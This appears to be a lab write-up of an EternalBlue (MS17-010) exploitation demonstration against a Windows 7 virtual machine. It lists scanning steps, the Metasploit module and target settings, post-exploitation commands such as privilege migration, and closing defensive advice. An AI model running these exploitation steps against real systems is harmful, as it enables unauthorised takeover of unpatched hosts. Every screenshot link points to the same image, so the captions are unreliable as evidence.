# MS17-010 | EternalBlue Vulnerability Demonstration

## Lab setup & Environment
**Operating system:** Windows 10
**Virtualisation software:** Oracle virtual machine (version 7.1.0 r164728 (Qt6.5.3))
**Download Oracle Virtual Machine:**
https://www.oracle.com/au/virtualization/technologies/vm/downloads/virtualbox-downloads.html

## Virtual machines
**Windows 7 (64 bits)**

IP address: 192.168.0.141

Type: Victim

**Download Windows 7 ISO image link:**

https://archive.org/details/Windows7-iso

**Kali Linux**

Ip address: 192.168.0.78

Type: Attacker

Tools used: Nmap, Nessus, Metasploit framework

**Download Kali Linux:**

https://www.kali.org/get-kali/#kali-platforms

## Tools used:

**Nmap:** Port scanning

**Nessus:** Vulnerability scanning

**Metasploit framework (Msfconsole):** For exploitation and post exploitation

## Target Vulnerability:

**Name:** EternalBlue (MS17-010)

**CVE ID:** CVE-2017-0144

**Type:** Remote code execution

**Service affected:** SMB v1 (Port 445)

## Steps-by-steps Process
### Setup Oracle virtual box

  ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)


### Command:
**Ping from kali Linux to windows:**

ping 192.168.0.141

**Ping from windows to kali Linux**

ping 192.168.0.78

 ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)
 

**Successful ping**

### Nessusd start and IP address:

https://localhost:8834

![After_Shutdownd](Screenshot/After_shutdown_command.PNG)
 

### Vulnerability report

 ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)

### Nmap 

nmap 192.168.0.141
 
 ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)


## Exploitation

### Commands:

**Msfconsole**

  ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)

**search ms1_010**

  ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)
  
**use exploit/windows/smb/ms17_010_eternalblue**
 
 ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)
 
**option command**
 
 ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)

 
LHOST: 192.168.0.78

RHOST: 192.168.0.141 (Victim)

RPORT: 445
 
 ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)

 
## Post exploitation

### Commands and their use:

**Meterpreter > getuid = Displays the username that the Meterpreter session is running as.**

 ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)

### System Information

 ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)

 
### Getting high level privilege
Meterpreter > run post/windows/manage/priv_migrate = get more privileged access

 ![After_Shutdownd](Screenshot/After_shutdown_command.PNG) 

### Screenshot command
 
 ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)
 
### Going into Desktop
 
 ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)
 
### Creating folder
 
 ![After_Shutdownd](Screenshot/After_shutdown_command.PNG)
 

### Shutdown command
 
![After_Shutdownd](Screenshot/After_shutdown_command.PNG)


### END

## For Defense

**Enable automatic updates for OS**

**Always apply latest Windows updates**

**Disable SMBv1 (For EternalBlue)**

**Powershell cmd:**

dism /online /norestart /disable-feature /featurename:SMB1Protocol

**Enable firewall/ window defender**

**Block unwanted incoming/outgoing traffic**

**Create rules to block ports (eg 445 for SMB)**

**Use of antivirus and scheduled scans**








